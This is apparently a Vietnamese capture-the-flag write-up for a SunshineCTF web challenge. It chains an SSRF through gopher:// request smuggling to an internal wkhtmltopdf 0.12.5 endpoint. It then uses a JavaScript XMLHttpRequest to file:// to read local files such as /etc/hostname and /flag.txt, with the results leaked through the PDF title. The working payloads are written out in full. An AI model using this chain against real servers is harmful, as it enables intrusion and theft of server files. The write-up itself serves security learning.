# Groundhog Day - Web (Hard)

**Flag:** `sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}`
**Files:** Không có file đính kèm
**Instance:** `https://odyssey.web.2026.sunshinectf.games`

## Đề bài

> The Punxsutawney Orbital Weather Authority has been broadcasting the same forecast since 1993.
> Every reading is fresh. Every date is February 2. The Bureau insists this is fine, and the groundhog has declined to comment.
> Their public console is up. Have a look at where it gets its numbers.

Đề bài giới thiệu một bảng điều khiển thời tiết (weather console) đang liên tục phát cùng một bản tin từ năm 1993. Mục tiêu là truy tìm nguồn gốc nơi hệ thống lấy dữ liệu.

## Phân tích

Giao diện trang web chính rất đơn điệu, chỉ có một khung nhập liệu (form) nhưng lại bị vô hiệu hoá bằng thẻ comment trong mã nguồn HTML. Bù lại, chính những dòng comment này lại là bản vẽ sơ đồ hệ thống vô giá mà tác giả bỏ quên:

```html
<!-- ops: console pulls station JSON at boot from http://127.0.0.1:8000/feed.
     override it with feed=<url> when PUNX-1 is down and you need to point at
     a spare station. ... -->
<!-- feed-debug: source=http://127.0.0.1:8000/feed bytes=350 -->
```

Khi truyền tham số `feed=<url>` (thông qua phương thức GET hoặc POST lên `/`), máy chủ sẽ ngoan ngoãn gọi đến URL đó rồi in toàn bộ nội dung body nhận được vào thẻ `<pre class="tape">`, kèm theo số lượng byte trong một dòng comment `feed-debug`. Phản hồi trả về giữ nguyên định dạng gốc, chỉ bị escape (mã hoá) các ký tự HTML. Đây rõ ràng là một kênh Server-Side Request Forgery (SSRF) cho phép ta đọc dữ liệu với tỷ lệ 1-1.

Quá trình quét các cổng mạng nội bộ phát hiện chính xác hai dịch vụ đang hoạt động:

| Mục tiêu | Phản hồi |
|---|---|
| `127.0.0.1:5000` | Đây chính là ứng dụng console hiện tại, chỉ có duy nhất một route gốc `/` |
| `127.0.0.1:8000` | Một API nội bộ mang tên "Bureau Archive" |
| `169.254.169.254` | Dịch vụ metadata giả lập môi trường GCP của hạ tầng tổ chức giải |

Điểm đặc biệt là API nội bộ tự hào "khoe" danh sách tính năng của nó ngay tại trang chủ `GET /` (dài 1045 byte):

```text
GET  /feed    Sinh dữ liệu JSON ngẫu nhiên
GET  /health  Trả về chữ "ok"
POST /report  Kết xuất (render) file PDF lưu trữ từ dữ liệu đầu vào (content, title)
              ... base64 in the `data` field.
NOTE(ops): ... mainly updating from wkhtmltopdf 0.12.5
```

Đích nhắm cuối cùng hiện lên rất rõ ràng: route `/report`. Khi ta POST dữ liệu vào đây, phần thân (body) sẽ được xuất bằng công cụ `wkhtmltopdf` phiên bản 0.12.5 - một phiên bản cổ lỗ sĩ khét tiếng với khả năng cho phép đọc file cục bộ. Tuy nhiên, hành trình tiếp cận nó bị cản bước bởi hai rào cản mang tính vật lý (do hệ thống quy định chứ không phải do ta phỏng đoán):

- Console SSRF luôn phát request dưới định dạng GET, nên khi đâm vào `/report` sẽ bị bật ngược lại bằng lỗi `405 Method Not Allowed`.
- Dịch vụ mock metadata thì khăng khăng đòi hỏi phải có header bảo mật `Metadata-Flavor: Google`.

Nhìn rộng ra bên ngoài, container này đã bị khoá chặt đường ra (no egress). Để kiểm chứng, tôi đã thử dựng một trạm DNS riêng (kết quả trang hiển thị trên trạm, nhưng console lại chê `bytes=0`). Qua phân tích sâu hơn, vấn đề nằm ở chỗ hệ thống có thể phân giải (resolve) được tên miền nhưng tường lửa lại chặn toàn bộ kết nối TCP ra ngoài. Vì không có giao thức `gopher://` trong các từ điển payload phổ biến, hướng đi này tạm thời đóng lại ở khâu nhận diện công cụ client của server.

## Hướng đã thử

| # | Giả thuyết (Rabbit Hole) | Kết luận |
|---|---|---|
| H2 | Giao thức `file://` bị chặn vì ứng dụng client không hỗ trợ | SAI. Lệnh chặn xuất phát từ bộ lọc (allow-list) chủ đích của tác giả, còn câu thông báo lỗi in ra là nguyên văn của thư viện libcurl. |
| H4 | Hai ứng dụng có thể còn chứa các endpoint ẩn | CHẾT. Đã vét cạn 139 từ đơn và khoảng 30 đường dẫn, mọi mã lỗi 405 đều trả về một cục body 153 byte y hệt nhau, chứng tỏ không có handler ẩn nào cả. |
| H5 | Tồn tại thủ thuật ép GET thành POST | CHẾT. Mọi phương pháp từ tham số `?_method`, header `X-HTTP-Method-Override`, mã hoá multipart, JSON body, đổi method sang PUT/PATCH/OPTIONS, mánh lới routing, thay 5 kiểu Host, thử 19 tên tham số... tất thảy đều vô dụng. |
| H9 | Container có thể truy cập nội dung từ một trạm (station) do người chơi kiểm soát | CHẾT. Không có kết nối ngoại mạng (no egress), TCP bị bóp nghẹt. |
| H10 | Máy chủ mock metadata có chứa cờ | CHẾT. Dù có smuggle được header để lọt vào đọc trọn vẹn toàn bộ cây `/computeMetadata/v1/`, thì bên trong cũng chỉ rỗng tuếch các thông số GCP tiêu chuẩn. |
| H14 | Thẻ `<iframe src="file://...">` có khả năng hiển thị (render) nội dung file | CHẾT. File tuy có bị fetch (gọi) thật, nhưng thư viện Qt từ chối vẽ văn bản (text) của các khung con (subframe), dẫn đến file PDF sinh ra không có bất kỳ dòng chữ (text operator) nào. |

## Lời giải

**Bước 1 - Lắng nghe tiếng khóc của lỗi (Error Message) để vạch mặt Client.**
Khi có sự cố, trang lỗi sẽ phun trực tiếp toàn bộ exception ra thẻ `<p class="fault">...</p>`. Bằng cách truyền vào 18 lớp dữ liệu lỗi cố ý, ta thu được các phản ứng sau:

```text
file://, data:, chữ thô   -> unsupported transport for station feed
http:// host ảo           -> station unreachable - URL rejected: No host part in the URL
cổng >= 65536             -> station unreachable - URL rejected: Port number was not a decimal number between 0 and 65535
127.0.0.1:1               -> station unreachable - Failed to connect to 127.0.0.1 port 1 after 0 ms: Could not connect to server
```

Chú ý kỹ văn phong của ba dòng thông báo cuối: nó rặc mùi của thư viện `libcurl` trong ngôn ngữ C. Các thư viện như `requests` hay `urllib3` của Python không bao giờ phun ra những câu kiểu `Failed to connect to <host> port <n> after <m> ms` hay `URL rejected:`. Từ đây rút ra hai chân lý: Giao thức `file://` bị đứt bóng là do bộ lọc kiểm duyệt thủ công của tác giả chứ không phải do client chê; và giao thức `gopher://` lách thành công qua khe hở của bộ lọc này (vì log báo `bytes=0`, không hiện lỗi fault nào, đồng nghĩa với việc kết nối đã được thực thi dưới ngầm).

Với `gopher://host:port/_<selector>`, libcurl percent-decode selector rồi gửi các byte đó xuống socket:

```text
gopher://127.0.0.1:8000/_GET%20/health%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
```

Cuộn băng (tape) sau đó trả về trọn vẹn cả HTTP header lẫn body:

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.13.7
Content-Type: text/plain; charset=utf-8
Content-Length: 3

ok
```
Selector cho phép gửi HTTP request với method và header đã chọn từ container. Response xác định dịch vụ là Werkzeug 3.1.8 trên Python 3.13.7.

**Bước 3 - Cú thọc sườn POST /report qua ngầm proxy.**

```http
POST /report HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: <n>

content=<h1>Feb 2 Summary</h1>
```

Phản hồi trả về `bytes=11230`, kèm theo JSON chứa đầy đủ các khoá `document`, `bytes`, `encoding`, `data`. Điều này chứng tỏ `wkhtmltopdf` đã thực sự bị kích hoạt. Nếu tiện tay nhét thêm `Metadata-Flavor: Google` vào khuôn request này, ta sẽ kéo được trọn vẹn cây metadata, qua đó chấm dứt ảo tưởng ở H10 rằng cờ nằm trong infra.

**Bước 4 - Khai thông kênh truyền văn bản.**
Sử dụng thẻ `<iframe src="file:///etc/passwd">` sinh ra một file PDF nhưng không chứa bất kỳ văn bản nào. Phân tích sâu hơn cho thấy file thực sự đã được thư viện đọc: gọi `file:///ctf/flag.txt` thì máy chủ báo lỗi `ContentNotFoundError` (vì không tìm thấy file), trong khi gọi `/etc/passwd` thì máy chủ im lặng nuốt gọn. Vấn đề cốt lõi là trình xuất (renderer) Qt từ chối vẽ loại nội dung text/plain bên trong khung con. Mọi nỗ lực dùng `<meta refresh>` hay `location=` để ép chuyển hướng đều vỡ mộng với thông báo `unknown error`.

Payload `<script>document.title="JSWORKS123"</script>` làm trường `/Title` trong PDF chứa marker này, xác nhận JavaScript chạy trong renderer. Có thể dùng `document.title` để đưa dữ liệu đọc được vào metadata; chuỗi trong `/Title` được mã hóa UTF-16BE.

**Bước 5 - Ăn cắp file qua cửa hậu XHR (XMLHttpRequest).**

```html
<script>
var x = new XMLHttpRequest();
x.open("GET", "file:///etc/hostname", false);
x.send();
document.title = "OK:" + x.responseText;
</script>
```
Phép thử đọc `/etc/hostname` trả `OK:d89c16037bd5`. Trong môi trường này, XHR tới `http://` báo `NETWORK_ERR`, còn request tới file local hoạt động. Body POST dùng form-urlencoded, nên dấu `+` phải được percent-encode để tránh bị đổi thành dấu cách.

**Bước 6 - Truy tìm kho báu.**
dò dẫm đường dẫn: Các ứng viên `/ctf/flag.txt` (đường dẫn đặc trưng của các bài pwn cùng kỳ), `/flag`, `/app/flag.txt`, `/opt/flag.txt` đều đâm đầu vào hướng không cho kết quả `ContentNotFoundError`. Rút cục, vị trí `/flag.txt` chói loà trả về flag trọn vẹn.

## Kết quả
```
sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}
```

## Tổ chức mã nguồn

```bash
python exploit.py                      # Kịch bản tự động lùng sục /flag.txt, /flag, /ctf/flag.txt theo thứ tự ưu tiên
python exploit.py /etc/passwd          # Chế độ thủ công cho phép đọc file tuỳ ý
python analysis/ssrf.py                # Tung ra 5 phát súng mở màn, in thông số bytes= và băng ghi âm tape
python analysis/gopher.py              # Đóng gói và tuồn lậu (smuggle) các request GET /health và POST /report
python analysis/pdfdump.py sanity      # Công cụ tự kiểm tra sức khoẻ của bộ trích xuất văn bản từ PDF
```
`exploit.py` dùng thư viện chuẩn. `analysis/` lưu các phép thử SSRF, gopher, JavaScript và đọc PDF: `ssrf.py`, `gopher.py`, `gopher2.py`, `js_check.py`, `js_lfi.py`, `pdfdump.py`, `pdfdebug.py`, `readfile.py`. `files/` giữ response HTML, tài liệu nội bộ và các PDF thử nghiệm như `root.html`, `station_index.txt`, `first_post_report_response.txt`, `sanity.pdf`, `xhr_hostname.pdf`, `lfi__etc_passwd.pdf`. Trạm thử bên ngoài đã được dọn dẹp sau bài.
